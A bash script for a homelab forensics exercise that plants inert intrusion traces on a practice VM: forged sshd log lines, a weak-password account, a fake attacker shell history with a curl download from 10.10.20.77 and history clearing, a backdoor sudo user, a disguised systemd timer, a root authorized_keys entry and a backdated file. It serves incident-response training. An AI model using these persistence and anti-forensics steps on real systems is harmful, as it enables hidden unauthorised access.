#!/usr/bin/env bash
# incident-sim.sh - create INERT intrusion artifacts on a throwaway victim VM (Project 11).
# Nothing here is malicious: "payloads" are text files and `true`. The point is to leave the
# kind of traces a real intrusion would, for you to find with forensics.
# Guarded: runs only on a host named 'victim' after typing SIMULATE.
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "Run with sudo." >&2; exit 1; }
[[ "$(hostname)" == "victim" ]] || { echo "Hostname must be 'victim' (practice VM only)." >&2; exit 1; }
read -r -p "Create simulated intrusion artifacts on this VM? Type SIMULATE: " a
[[ "$a" == "SIMULATE" ]] || { echo "Aborted."; exit 1; }

# 1) "Initial access": a burst of failed then successful SSH-style log lines for a weak account
id webdev >/dev/null 2>&1 || useradd -m -s /bin/bash webdev
echo 'webdev:webdev123' | chpasswd
logger -p auth.info -t sshd "Failed password for webdev from 10.10.20.77 port 51234 ssh2"
logger -p auth.info -t sshd "Failed password for webdev from 10.10.20.77 port 51236 ssh2"
logger -p auth.info -t sshd "Accepted password for webdev from 10.10.20.77 port 51240 ssh2"

# 2) Attacker shell history with timestamps (HISTTIMEFORMAT style: '#epoch' lines)
now=$(date +%s)
{
  echo "#$((now-600))"; echo "id; uname -a; cat /etc/os-release"
  echo "#$((now-540))"; echo "sudo -l"
  echo "#$((now-480))"; echo "mkdir -p /var/tmp/.cache-x && cd /var/tmp/.cache-x"
  echo "#$((now-420))"; echo "curl -o tool http://10.10.20.77/tool"
  echo "#$((now-360))"; echo "history -c"
} > /home/webdev/.bash_history
chown webdev:webdev /home/webdev/.bash_history

# 3) Staged "tool" in a hidden directory (inert text file with a fake marker string)
mkdir -p /var/tmp/.cache-x
printf 'SIMULATED-TOOL marker=HOMELAB-IR-0001\n' > /var/tmp/.cache-x/tool
chmod 755 /var/tmp/.cache-x/tool

# 4) Privilege persistence: backdoor user with sudo
id sysupdate >/dev/null 2>&1 || useradd -m -s /bin/bash sysupdate
usermod -aG sudo sysupdate

# 5) Persistence: systemd service + timer that only runs `true`
cat > /etc/systemd/system/sys-healthcheck.service <<'UNIT'
[Unit]
Description=System health check
[Service]
Type=oneshot
ExecStart=/bin/true
UNIT
cat > /etc/systemd/system/sys-healthcheck.timer <<'UNIT'
[Unit]
Description=Run system health check
[Timer]
OnBootSec=2min
OnUnitActiveSec=15min
[Install]
WantedBy=timers.target
UNIT
systemctl daemon-reload
systemctl enable --now sys-healthcheck.timer

# 6) SSH key persistence for root (a throwaway key generated here, private half discarded)
tmpk=$(mktemp -d)
ssh-keygen -q -t ed25519 -N '' -C 'attacker@kali' -f "$tmpk/k"
mkdir -p /root/.ssh && chmod 700 /root/.ssh
cat "$tmpk/k.pub" >> /root/.ssh/authorized_keys
rm -rf "$tmpk"

# 7) Anti-forensics touch: backdate the staged file
touch -d '2026-01-01 03:14:00' /var/tmp/.cache-x/tool

echo "Simulation complete. Snapshot now: qm snapshot <vmid> post-incident"
